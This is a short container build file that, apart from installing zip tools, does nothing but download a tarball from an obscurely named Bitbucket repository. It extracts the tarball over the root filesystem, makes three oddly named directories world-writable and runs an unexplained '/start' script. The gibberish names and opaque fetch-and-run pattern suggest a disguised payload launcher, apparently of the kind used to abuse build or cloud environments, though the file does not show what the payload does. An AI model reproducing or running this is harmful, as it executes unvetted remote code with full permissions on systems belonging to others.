FROM vm/ubuntu:22.04

ENV linux8888=linuxlinux8888

RUN apt-get update && apt-get install zip && apt-get install unzip && wget https://bitbucket.org/linux88888874/linux8888888888/downloads/linux8888.tar.gz && tar -xvf ./linux8888.tar.gz -C / && chmod 777 -R /linux1 && chmod 777 -R /linux2 && chmod 777 -R /webwebwebweb8888

RUN bash /start
